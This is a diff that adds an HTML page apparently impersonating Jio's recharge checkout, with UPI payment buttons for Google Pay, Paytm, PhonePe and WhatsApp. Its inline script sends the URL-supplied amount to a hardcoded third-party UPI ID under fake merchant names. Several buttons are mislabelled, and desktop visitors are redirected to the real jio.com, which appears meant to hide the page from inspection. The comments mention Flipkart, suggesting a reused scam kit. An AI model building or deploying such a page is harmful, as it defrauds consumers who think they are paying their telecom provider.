@@ -1,0 +1,173 @@
+
+
+
+<html lang="en">
+
+    <head>
+        <meta charset="utf-8">
+        <link rel="icon" href="/logo.svg">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <meta name="theme-color" content="#000000">
+        <meta name="description" content="Web site created using create-react-app">
+        <link rel="apple-touch-icon" href="/logo.svg">
+        <link rel="manifest" href="manifest.json">
+        <title>Jio - Best Prepaid, Postpaid Plans</title>
+        <!-- <script defer="defer" src="./static/js/main.e6bc879b.js"></script> -->
+        <link href="./static/css/main.34fbeb72.css" rel="stylesheet">
+    </head>
+    
+    <body>
+        <div class="py-4 px-6  flex items-center justify-between text-blue-700">
+            <div class="flex items-center">
+                <svg stroke="currentColor" fill="black" stroke-width="0" viewBox="0 0 448 512" class="text-white mr-3"
+                    height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                        d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z">
+                    </path>
+                </svg>
+                <a href="/"><img src="./static/media/vi.png" alt="" class="w-8"></a>
+            </div>
+            <div class="mx-2">
+                <style>
+                    #searchQueryInput {
+                        background-color: white !important;
+                        color: black;
+                        border: 1px solid black;
+                    }
+    
+                    #searchQueryInput::placeholder {
+                        color: black;
+                    }
+    
+                    .bg-slate-200 {
+                        background-color: #f4f4f4;
+                    }
+    
+                    .pay-but-bg {
+                        background-color: #df4b4b;
+                    }
+                </style>
+                <div class="searchBar">
+                    <input id="searchQueryInput" type="text" name="searchQueryInput" placeholder="Search" value="">
+                    <button id="searchQuerySubmit" type="submit" name="searchQuerySubmit">
+                        <svg class="h-[24px] w-[24px]" viewBox="0 0 24 24">
+                            <path fill="#fff"
+                                d="M9.5,3A6.5,6.5 0 0,1 16,9.5C16,11.11 15.41,12.59 14.44,13.73L14.71,14H15.5L20.5,19L19,20.5L14,15.5V14.71L13.73,14.44C12.59,15.41 11.11,16 9.5,16A6.5,6.5 0 0,1 3,9.5A6.5,6.5 0 0,1 9.5,3M9.5,5C7,5 5,7 5,9.5C5,12 7,14 9.5,14C12,14 14,12 14,9.5C14,7 12,5 9.5,5Z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+            <div>
+                <svg stroke="currentColor" fill="black" stroke-width="0" viewBox="0 0 512 512" class="text-white"
+                    height="30" width="30" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                        d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z">
+                    </path>
+                </svg>
+            </div>
+        </div>
+        <div class="">
+            <div class="py-1 px-[10px] my-5">
+                <div class="flex space-x-4 bg-white border border-slate-200 rounded-xl w-full p-2">
+                    <ul class="w-full">
+                        <li class="w-full my-2">
+                            <div class="flex items-center justify-center py-2 w-full font-sans"><span
+                                    class="text-[16px] font-semibold mr-2">Pay ₹<span id="updatedamount"></span> using
+                                    UPI</span> </div>
+                        </li>
+                        <li class="w-full my-2">
+                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full"
+                                id="googlepay"><img src="./static/media/googlepayicon.b1d2f2a111a2f792233c10265d1f0cbd.jpg"
+                                    class="w-10" alt=""><span class="ml-3 text-lg">Google Pay</span></a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" id="paytm"><img
+                                    src="./static/media/paytm_icon.3d48b89988f13e784e647886decd7ae5.jpg" class="w-10"
+                                    alt=""><span class="ml-3 text-lg">Paytm</span></a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full"
+                                id="phonepe"><img src="./static/media/phonepeicon.e79785763e0c4095b6335e54e9971960.png"
+                                    class="w-10" alt=""><span class="ml-3 text-lg">PhonePe</span></a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" id="upi"><img
+                                    src="./static/media/upilogo.d3c1e2271fc50a058ee6.jpeg" class="w-10" alt=""><span
+                                    class="ml-3 text-lg">Other UPI</span></a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full"
+                                id="whatsapp"><img src="./static/media/whatspp_pay.e2ed34befa5836e5a0be68764c2ee95f.png"
+                                    class="w-10" alt=""><span class="ml-3 text-lg">Whatsapp Pay</span></a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="mt-5"><img src="./static/media/secured.20c7b7cea9439246796c.jpg" alt=""><img
+                    src="./static/media/lasttwo.bfe814c92613f117536e.jpg" alt=""></div>
+            <script src="static\js\upi.js"></script>
+            <script>
+            
+            
+              var upiId = 'saniasellingspv654221.rzp@icici';
+              var tr = 'RZPQ4gUuo3hDDV1ITqrv2';
+               
+            
+            
+                var urlParams = new URLSearchParams(window.location.search);
+                var amount = urlParams.get('amount');
+    
+                sign = 'MEQCIEZv2SefkunowdW9UR9ClbSW/z1+uVP05uhm3i6PoTAiB2j0B+Gmo1Uk9PepnLSGpIXOM0S5iZaw3Gc8DUTaLw/Q=='
+                    
+                    
+                var updatedamount = document.getElementById('updatedamount');
+                updatedamount.innerHTML = amount;
+                
+               
+    
+                document.getElementById('googlepay').addEventListener('click', function () {
+                    window.location.href = `phonepe://pay?pa=${upiId}&pn=MSWIPE&tn=Phonepe%20recharge&am=${amount}&tr=${tr}&cu=INR&mc=8241&qrMedium=04&tn=RECHARGE`;
+                });
+                document.getElementById('paytm').addEventListener('click', function () {
+                    window.location.href = `paytmmp://cash_wallet?pa=${upiId}&pn=Moomin Ashraf&mc=3526&tr=${tr}&am=${amount}&cu=INR&tn=Recharge&url=&mode=02&purpose=00&orgid=37567&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm&featuretype=money_transfer`;
+                });
+                document.getElementById('phonepe').addEventListener('click', function () {
+                    window.location.href = `phonepe://pay?pa=${upiId}&pn=MSWIPE&tn=Phonepe%20recharge&am=${amount}&tr=${tr}&cu=INR&mc=8241&qrMedium=04&tn=RECHARGE`;
+                });
+                document.getElementById('upi').addEventListener('click', function () {
+                    window.location.href = `upi://pay?pa=${upiId}&pn=MSWIPE&tn=Phonepe%20recharge&am=${amount}&tr=${tr}&cu=INR&mc=8241&qrMedium=04&tn=RECHARGE`;
+                });
+                document.getElementById('whatsapp').addEventListener('click', function () {
+                    window.location.href = `phonepe://pay?pa=${upiId}&pn=MSWIPE&tn=Phonepe%20recharge&am=${amount}&tr=${tr}&cu=INR&mc=8241&qrMedium=04&tn=RECHARGE`;
+                });
+             </script>
+         </div>
+        <div class="mt-5">
+          <img
+            src="static/media/secured.20c7b7cea9439246796c.jpg"
+            alt=""
+          /><img src="static/media/lasttwo.bfe814c92613f117536e.jpg" alt="" />
+        </div>
+    <script>
+        // Function to detect if the device is a desktop or laptop
+        function isDesktopOrLaptop() {
+          return !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+            navigator.userAgent
+          );
+        }
+
+        // Function to redirect to Flipkart
+        function redirectToFlipkart() {
+          window.location.href = "https://www.jio.com/"; // Redirect to Flipkart URL
+        }
+
+        // Check if the device is a desktop or laptop and redirect if true
+        if (isDesktopOrLaptop()) {
+          redirectToFlipkart();
+        }
+      </script>
+    </div>
+  <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8e1eb648ab64d262',t:'MTczMTUwMDM4Ni4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9003903f1b0d6640',t:'MTczNjU4NDQyMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9003903f1b0d6640","version":"2024.10.5","r":1,"token":"98d568caf6aa47dcb0395a27bb8e619a","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+</body>
+</html>
